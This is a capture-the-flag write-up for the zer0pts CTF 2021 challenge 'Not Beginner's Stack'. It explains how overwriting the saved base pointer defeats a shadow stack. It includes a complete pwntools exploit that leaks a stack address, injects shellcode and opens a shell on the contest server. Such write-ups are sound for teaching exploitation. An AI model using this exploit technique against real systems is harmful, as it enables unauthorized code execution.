# [zer0pts CTF 2021](https://2021.ctf.zer0pts.com) - "Not Beginner's Stack"

## Challenge

### Description

Elementary pwners love to overwrite the return address. This time you can't! \
`nc pwn.ctf.zer0pts.com 9011`

### Files

```
not_beginners_stack_0956db1b183fd1e9877f64c713871f3b.tar.gz/
  not_beginners_stack/
    chall
    FOR_BEGINNERS.md
    main.S
```

## Analysis

The tarball contains a file `FOR_BEGINNERS.md` explaining the stack, how stack buffer overflows are normally used to overwrite the return pointer and why it won't work in this challenge since `call`/`ret` are replaced with `jmp`s reading return pointers from a "shadow stack" stored in the `.bss` section. It also provides a hint on what can be done instead, i.e. overwriting the base pointer.

We are given the assembly code `main.S` of the challenge binary, so there is not much reverse engineering required to craft an exploit. I use `objdump -d -M intel chall` to find the raw addresses and generated labels I need.

`checksec` on `chall`:
```
[*] "/home/luca/projects/zer0pts CTF/pwn/Not Beginner's Stack/not_beginners_stack/chall"
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
This should be easy.[1]

The output of `checksec` is especially important for this challenge as it correctly reports the stack to be executable *in theory*, which it is not on my local machine or, apparently, on modern kernels in general.[2] This means that we cannot get the shellcode part of my exploit to work locally, but at least it works on the remote.

> It works on their machine. — Then we'll ship their machine.

With the return addresses on a shadow stack, we need to find a way to write there. Since `rbp` is still saved to the "regular" stack, we can overwrite it with a pointer into the data segment (the address of which is known because of `No PIE`) using the vulnerable `read` in `vuln` (reading up to 4096 bytes into a 256-byte stack buffer). Then, the `leave` instruction at the end of `vuln` sets `rsp` to the current base pointer and pops `rbp` off the stack, thus setting it to our desired value. The subsequent `read` in `notvuln` now writes a shiny new shadow stack to `[rbp-0x100]`.

## Exploit

My exploit requires the current `stable` version of `pwntools` (`4.3.1` at the time of writing).

```python
#!/usr/bin/env python3

from pwn import *

BINARY = 'not_beginners_stack/chall'
```

I implemented my own little helper class for building the shadow stack, similar to `pwntools`' `ROP`.

```python
class ShadowStack:
    def __init__(self, binary):
        self.binary = binary
        self.depth = 0
        self.stack = b''
        self.meta = []

    def __getattr__(self, sym):
        addr = self.binary.symbols[sym]
        def call(*args):
            if args:
                raise NotImplementedError
            self.call(addr, sym)

        return call

    def call(self, addr, meta=None):
        self.depth += 1
        self.stack = p64(addr) + self.stack
        self.meta.append(meta)

    def chain(self, length=None):
        return flat({0x0: p32(self.depth), 0x6: self.stack}, length=length)

    def dump(self):
        stack = self.stack
        dump = [f'__stack_depth: {self.depth}', '__stack_shadow:']
        for i, m in enumerate(self.meta):
            addr = int.from_bytes(stack[-8:], context.endian)
            stack = stack[:-8]
            dump.append(f'  [{len(self.meta)-i-1}] {hex(addr)} ' + (m or '<raw>'))
        return '\n'.join(dump)
```

The first part of the exploit builds a new shadow stack used to overwrite the current one as described above:
1. `notvuln()` — `enter`s twice, but `leave`s only once; the second `enter` pushes an address to the regular stack onto it
2. `vuln()` — `enter`s the second stack frame from the previous call again, `rdi`, `rsi` and `rdx` will be set to `0`, `[rbp-0x100]` and `0x1000`, respectively
3. `0x400115()`[3] — set `rdi` to `1`, then call `write`, then `read`; this leaks 4096 bytes of stack memory and reads some shellcode onto the stack; the aforementioned stack address is at offset `0x100` in the leak
5. `..@9.return_address()` — `leave` to set `rbp` to `[__stack_shadow+0x100]`
6. `..@5.return_address()` — read another shadow stack
7. `exit()` — not used in the final exploit, cleanly exit when testing e.g. the leak

```python
context(binary=BINARY)
elf = context.binary

shadow = ShadowStack(elf)
shadow.notvuln()
shadow.vuln()
#shadow.call(0x40018a)
shadow.call(0x400115)
getattr(shadow, '..@9.return_address')()
getattr(shadow, '..@5.return_address')()
shadow.exit()
print(shadow.dump())
```

Send/receive data as described above or required for `read` to continue:

```python
shellcode = asm(shellcraft.sh())

#conn = process(BINARY)
conn = remote('pwn.ctf.zer0pts.com', 9011)

#gdb.attach(conn)

# regular i/o
conn.sendafter(b'Data: ', flat({0x100: elf.symbols['__stack_depth']+0x100})) # overwrite rbp
conn.sendafter(b'Data: ', shadow.chain(0x100)) # overwrite shadow stack

# shadow.notvuln()
conn.sendafter(b'Data: ', b'A')
conn.sendafter(b'Data: ', b'A')

# shadow.vuln()
conn.sendafter(b'Data: ', b'A')

leak = conn.recvn(0x1000)
#print(hexdump(leak))

# shadow.call(0x40018a)
#conn.send(flat({0x0: shellcode, 0x100: elf.symbols['__stack_depth']+0x100}, length=0x1000))

# shadow.call(0x400115)
conn.send(flat(shellcode, length=0x100))
```

The second part of the exploit consists of extracting the leaked stack address and building another shadow stack to jump to the shellcode at `stack_addr-0x100`:

```python
stack_addr = int.from_bytes(leak[0x100:0x108], context.endian)
print('Leaked address:', hex(stack_addr))

# getattr(shadow, '..@5.return_address')()
shadow = ShadowStack(elf)
shadow.call(stack_addr-0x100)
conn.send(shadow.chain(0x100))
#conn.send(p32(1))

conn.interactive()
```

(For testing the leak, we can send `1` instead of the shadow stack. The process then returns to `exit` instead of the shellcode to terminate itself after the leak.)

This will give us a shell from which we can run `cat flag-*.txt`. Yay!

```
zer0pts{1nt3rm3d14t3_pwn3r5_l1k3_2_0v3rwr1t3_s4v3d_RBP}
```

Sometimes the script will hang when reading the leak. `Ctrl-C` and running it again works for me.

## Footnotes

1. It still took me way too long to get to a working exploit or even the leak.
2. It could have been even easier: As it turns out, not only is the stack executable, but the data segment as well.
3. I originally intended to use `0x40018a` here since it would ensure that the following `leave` (which would also be included, rendering `..@9.return_address` unnecessary) loads `[__stack_shadow+0x100]` into `rbp` by writing that address to the stack again. However, the value is already there and I did not want to print another prompt or otherwise separate the final two unconditional `send`s, so I chose to use `0x400115` and write as much bytes as would be consumed. Writing as much bytes as `read` would consume at `0x40018a` did not work — overflowing the buffer with 4096 bytes lead to a segmentation fault.
